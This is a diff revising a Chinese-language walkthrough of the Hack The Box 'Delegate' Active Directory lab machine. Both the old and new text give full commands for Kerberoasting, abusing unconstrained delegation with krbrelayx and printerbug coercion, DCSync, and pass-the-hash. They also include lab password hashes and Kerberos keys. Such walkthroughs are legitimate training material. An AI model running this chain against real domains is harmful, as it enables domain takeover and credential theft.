@@ -1,203 +1,178 @@
 ---
 title: Delegate
 weight: -724
+date: 2025-12-22
 tags:
   - windows
   - medium
+  - smb
   - winrm
-  - kud
   - targeted-kerberoasting
+  - unconstrained-delegation
+  - dcsync
 ---
 
 ![delegate_rank.png](https://labs.hackthebox.com/achievement/machine/preview/697550/724.png)
 
-## 00. 摘要
+Delegate 是一台中等难度的 Windows AD 靶机。立足点在 Guest 空口令可读的 `NETLOGON`，提权的核心是一个普通域用户手里本不该出现的 `SeEnableDelegationPrivilege`。
 
-> 关键词：信息泄露、ASREProast、LDAP侦察、Shadow Credentials、Kerberos Relay
+## 简要流程图
 
-1. 信息收集：端口扫描发现开放SMB服务，然后使用 `Guest` 账户枚举 SMB 服务
-	1. 得到 `A.Briggs` 账户
-2. 信息收集：bloodhound
-	1. `A.Briggs` -- GenericWrite -> `N.Thompson` -- CanPSRemote -> `DC1$`
-	2. Targeted Kerberoasting 得到 `N.Thompson` 账户
-3. 信息收集：`whoami /priv`，发现一个特殊权限
-	1. SeEnableDelegationPrivilege -> 可以对指定机器启用非约束性委派
-4. 非约束性委派攻击拿到 `DC1$`
-5. DCSync拿到 `Administrator`
+![流程图](flow.png)
 
+## 文字版流程
 
+1. 立足：`Guest` 空口令枚举 SMB，`NETLOGON` 里的 `users.bat` 泄露 `A.Briggs` 口令。
+2. 横向：`A.Briggs` 对 `N.Thompson` 有 `GenericWrite`，Targeted Kerberoasting 破出 `N.Thompson` 口令，WinRM 登录拿 user flag。
+3. 侦察：`N.Thompson` 的 `whoami /priv` 亮出 `SeMachineAccountPrivilege` 与 `SeEnableDelegationPrivilege`。
+4. 提权：用这两个权限自造非约束委派机器 `DELEGATE$`，`printerbug` 强制 `DC1` 认证，`krbrelayx` 抓到 `DC1$` 的 TGT。
+5. 收尾：以 `DC1$` 身份 DCSync 导出 `Administrator` 哈希，`psexec` 拿下域控。
 
-delegate.vl\A.Briggs:P4ssw0rd1#123
-
-python3 ~/my_data/Tools/targetedKerberoast/targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
-
-john cred.txt --wordlist=/usr/share/wordlists/rockyou.txt
-
-delegate.vl\N.Thompson:KALEB_2341
-
-SeMachineAccountPrivilege -> create Machine
-SeEnableDelegationPrivilege -> Enable Unconstrained Delegation on a Machine
+BloodHound 里的关键边：
 
 ```
-$ netexec smb 10.129.174.10 -u "Guest" -p "" --shares
-
-$ impacket-smbclient Guest@10.129.174.10 -no-pass
-Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
-
-Type help for list of commands
-# shares
-ADMIN$
-C$
-IPC$
-NETLOGON
-SYSVOL
-# use NETLOGON
-# tree
-/users.bat
-Finished - 0 files and folders
-# cat users.bat
-rem @echo off
-net use * /delete /y
-net use v: \\dc1\development 
-
-if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
-
-
+A.Briggs -[GenericWrite]-> N.Thompson -[CanPSRemote]-> DC1
 ```
+
+## 正文细节
+
+### 0x01 立足：Guest 空口令，NETLOGON 里捡到第一组凭据
+
+nmap 是标准域控指纹，SMB(445) 开着，从这里进。
 
 ```bash
-# 添加机器账户
-impacket-addcomputer -computer-name 'DELEGATE$' -computer-pass 'Password123!' -dc-ip 10.129.174.10 'delegate.vl'/'N.Thompson':'KALEB_2341'
-
-bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'DELEGATE$' -f TRUSTED_FOR_DELEGATION
-
-# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
-addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/DELEGATE.delegate.vl' -t 'DELEGATE$' -dc-ip 10.129.234.69 dc1.delegate.vl --additional
-
-addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/DELEGATE.delegate.vl' -t 'DELEGATE$' -dc-ip 10.129.234.69 dc1.delegate.vl
-
-
-# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
-dnstool.py -u 'delegate.vl\DELEGATE$' -p 'Password123!' --action add --record DELEGATE.delegate.vl --data 10.10.14.13 --type A -dns-ip 10.129.234.69 dc1.delegate.vl
-
-# 3. Check that the record was added successfully (after ~3 minutes)
-nslookup DELEGATE.delegate.vl 10.129.234.69
-
-# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)
-# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys
-krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'
-krbrelayx.py --krbsalt 'DELEGATE.VLhost/delegate.delegate.vl' --krbpass 'Password123!'
-
-DELEGATE.VLhost/delegate.delegate.vl
-
-# 5. Authentication coercion
-# PrinterBug, PetitPotam, PrivExchange, ...
-printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'
-
-printerbug.py delegate.vl/'N.Thompson':'KALEB_2341'@'dc1.delegate.vl' 'DELEGATE.delegate.vl'
-
+# 完整 nmap 端口表贴这里（DC 标准套件：SMB / LDAP / Kerberos / WinRM）
 ```
 
+`Guest` 空口令可以登录，`NETLOGON` 对认证用户可读，里面是登录脚本 `users.bat`：
 
+```bash
+netexec smb 10.129.174.10 -u 'Guest' -p '' --shares
+impacket-smbclient Guest@10.129.174.10 -no-pass
+```
 
+```
+# use NETLOGON
+# get users.bat
+net use * /delete /y
+net use v: \\dc1\development
+if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
+```
 
+命令里挂的是 `/user:Administrator`，容易让人以为是域管口令，但这行只在当前用户为 `A.Briggs` 时才执行。实测这组口令属于 `A.Briggs`：
 
-evil-winrm -u "N.Thompson" -p 'KALEB_2341' -i 10.129.129.92
+```
+delegate.vl\A.Briggs:P4ssw0rd1#123
+```
 
+### 0x02 横向：GenericWrite 换一张可爆破的票
 
-impacket-psexec 'delegate.vl'/'N.Thompson':'KALEB_2341'@'10.129.166.163'
+BloodHound 第一条边就够用：`A.Briggs` 对 `N.Thompson` 有 `GenericWrite`，可写 `servicePrincipalName`，直接上 Targeted Kerberoasting。
 
+```bash
+targetedKerberoast.py -v -d 'delegate.vl' -u 'A.Briggs' -p 'P4ssw0rd1#123'
+john cred.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
+口令在 rockyou 里，直接爆出：
 
-impacket-getTGT -dc-ip "10.129.129.92" 'delegate.vl'/'DELEGATE$':'Password123!'
+```
+delegate.vl\N.Thompson:KALEB_2341
+```
 
-export KRB5CCNAME="DELEGATE$.ccache"
+`N.Thompson` 能 WinRM，登进去拿 user flag：
 
-impacket-getST -impersonate "Administrator" -spn cifs/DC1.delegate.vl -k -no-pass -dc-ip "10.129.129.92" 'delegate.vl'/'DELEGATE$'
+```bash
+evil-winrm -u 'N.Thompson' -p 'KALEB_2341' -i 10.129.174.10
+```
 
+### 0x03 侦察：两个委派权限
 
+`whoami /priv` 给出两行平时见不到的权限：
 
+```
+SeMachineAccountPrivilege     Add workstations to domain
+SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation
+```
 
-combine ... boom!
+`SeEnableDelegationPrivilege` 是这台靶机唯一真正非常规的地方：是否可信任委派这个开关默认只有域管能拨，这里却下放给了一个普通域用户。配合 `SeMachineAccountPrivilege` 能凭空造账户，两个权限凑齐，我就能自己造一台机器并把它设成可信任非约束委派。这种组合在真实环境里几乎见不到。
 
-1. impacket-addcomputer -computer-name 'DELEGATE$' -computer-pass 'Password123!' -dc-ip 10.129.129.92 'delegate.vl'/'N.Thompson':'KALEB_2341'
+### 0x04 提权：自造非约束委派机器，强制 DC1 认证抓 TGT
 
-# 获取计算机对象
-$computer = Get-ADComputer -Identity 'DELEGATE$'
-# 启用非约束性委派
-Set-ADAccountControl -Identity $computer -TrustedForDelegation $true
+这一步的核心机制用一张图更直观。
 
-or `bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'DELEGATE$' -f TRUSTED_FOR_DELEGATION`
+![非约束委派抓取 TGT 原理](unconstrained-delegation.png)
 
+非约束委派机器会缓存任何向它认证者的 TGT。造一台这样的机器，用 `printerbug` 强制 `DC1` 来认证，`DC1$` 的 TGT 就落进它的缓存，我控制这台机器就能直接读走。
 
+动手部分是一条紧耦合的链。先造机器账户 `DELEGATE$`，给它拨上 `TRUSTED_FOR_DELEGATION`：
+
+```bash
+impacket-addcomputer -computer-name 'DELEGATE$' -computer-pass 'Password123!' \
+  -dc-ip 10.129.174.10 'delegate.vl'/'N.Thompson':'KALEB_2341'
+
+bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl \
+  add uac 'DELEGATE$' -f TRUSTED_FOR_DELEGATION
+```
+
+`DC1` 认证时得能解析到我，所以给 `DELEGATE$` 挂一个受控主机名（写进 `msDS-AdditionalDnsHostName`），再往域内 DNS 加一条指向攻击机的 A 记录。DNS 记录写下去不是立刻生效，等约 3 分钟：
+
+```bash
+addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' \
+  -s 'cifs/DELEGATE.delegate.vl' -t 'DELEGATE$' --additional -dc-ip 10.129.174.10 dc1.delegate.vl
+
+dnstool.py -u 'delegate.vl\DELEGATE$' -p 'Password123!' \
+  --action add --record DELEGATE.delegate.vl --data 10.10.14.13 --type A -dns-ip 10.129.174.10 dc1.delegate.vl
+
+nslookup DELEGATE.delegate.vl 10.129.174.10
+```
+
+记录生效后起 `krbrelayx` 监听。这里用 `krbrelayx` 而不是 `ntlmrelayx`，因为要接的是转发过来的 Kerberos TGT，落到 ccache。它需要 `DELEGATE$` 的 Kerberos 密钥来解票，喂盐值和口令让它自己算（`krbsalt` 的 realm 部分大写）：
+
+```bash
+krbrelayx.py --krbsalt 'DELEGATE.VLhost/delegate.delegate.vl' --krbpass 'Password123!'
+```
+
+监听起好，`printerbug` 强制 `DC1` 向我的主机名发起认证：
+
+```bash
+printerbug.py delegate.vl/'N.Thompson':'KALEB_2341'@'dc1.delegate.vl' 'DELEGATE.delegate.vl'
+```
+
+`DC1` 一认证，`krbrelayx` 就把 `DC1$` 的 TGT 落到本地 ccache。跑一遍 `impacket-findDelegation` 确认 `DELEGATE$` 处于非约束状态：
 
 ```
 $ impacket-findDelegation 'delegate.vl'/'N.Thompson':'KALEB_2341'
-Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
-AccountName  AccountType  DelegationType  DelegationRightsTo 
+AccountName  AccountType  DelegationType  DelegationRightsTo
 -----------  -----------  --------------  ------------------
 DELEGATE$    Computer     Unconstrained   N/A
 ```
 
+### 0x05 收尾：DC1$ 身份 DCSync
 
+`DC1$` 是域控机器账户，天然带目录复制权限。加载它的 ccache，DCSync 把域凭据拖下来：
 
-
-
-
-
-
+```bash
+export KRB5CCNAME='DC1$.ccache'
 impacket-secretsdump -k 'delegate.vl'/'DC1$'@'dc1.delegate.vl' -no-pass
+```
 
 ```
-┌─[sg-dedivip-1]─[10.10.14.13]─[lambermaybe@htb-whajtrkjwf]─[~/my_data/Machines/Delegate]
-└──╼ [★]$ impacket-secretsdump -k 'delegate.vl'/'DC1$'@'dc1.delegate.vl' -no-pass
-Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
-
-[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
-
-
-impacket-psexec 'Administrator@delegate.vl' -hashes aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93
-
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
-A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
-b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
-R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
-J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
-N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
-DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
-DELEGATE$:4601:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
-[*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
-Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
-Administrator:des-cbc-md5:ce257f16ec25e59e
-krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
-krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70
-krbtgt:des-cbc-md5:ef491c5b736bd04c
-A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
-A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
-A.Briggs:des-cbc-md5:38da2a92611631d9
-b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
-b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
-b.Brown:des-cbc-md5:ce407ac8d95ee6f2
-R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
-R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
-R.Cooper:des-cbc-md5:a70e158c75ba4fc1
-J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
-J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
-J.Roberts:des-cbc-md5:6858c8d3456451f4
-N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
-N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
-N.Thompson:des-cbc-md5:7cab43c191a7ecf2
-DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
-DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
-DC1$:des-cbc-md5:9e16cd46ad54cba7
-DELEGATE$:aes256-cts-hmac-sha1-96:e046a58d1ef38554e96c89357202d5a8735f50971b91aa803b1b8cb3adccc744
-DELEGATE$:aes128-cts-hmac-sha1-96:3633f49c0af4aa1c87ce5c81d259b99b
-DELEGATE$:des-cbc-md5:cdc297251673a86e
-[*] Cleaning up... 
+...
 ```
+
+拿 `Administrator` 的 NT 哈希做 pass-the-hash，登上去取 root flag：
+
+```bash
+impacket-psexec 'Administrator@delegate.vl' \
+  -hashes aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93
+```
+
+## 参考链接
+
+1. [The Hacker Recipes - Unconstrained delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained)
+2. [The Hacker Recipes - Kerberoasting](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
+3. [dirkjanm - krbrelayx](https://github.com/dirkjanm/krbrelayx)
